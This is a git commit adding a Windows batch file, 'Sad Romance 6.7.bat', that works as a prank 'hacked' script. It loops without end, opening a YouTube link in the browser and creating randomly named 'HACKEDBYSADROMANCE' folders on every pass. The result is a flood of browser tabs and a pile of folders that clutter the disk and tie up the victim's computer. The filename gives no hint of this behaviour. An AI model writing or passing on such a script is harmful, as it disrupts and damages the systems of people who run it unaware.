715b136dfa3eb6b85bd26b0679c14b45eb52e8c9
ilushka_boy10 <ilushkaboyilusa@gmail.com>
2025-12-18 14:00:04 +0300

    Create Sad Romance 6.7.bat

---
+++ Sad Romance 6.7.bat
@@ -0,0 +1,16 @@
+@echo off
+title HACKED BY SAD ROMANCE
+color 4
+:hacked
+start https://www.youtube.com/watch?v=ja7JAJNe8a0
+md HACKEDBYSADROMANCE%random%
+md HACKEDBYSADROMANCE%random%
+md HACKEDBYSADROMANCE%random%
+md HACKEDBYSADROMANCE%random%
+md HACKEDBYSADROMANCE%random%
+echo HACKED BY SAD ROMANCE
+echo HACKED BY SAD ROMANCE
+echo HACKED BY SAD ROMANCE
+echo 6767676767676767
+echo YOUR TIME: %time%
+goto hacked
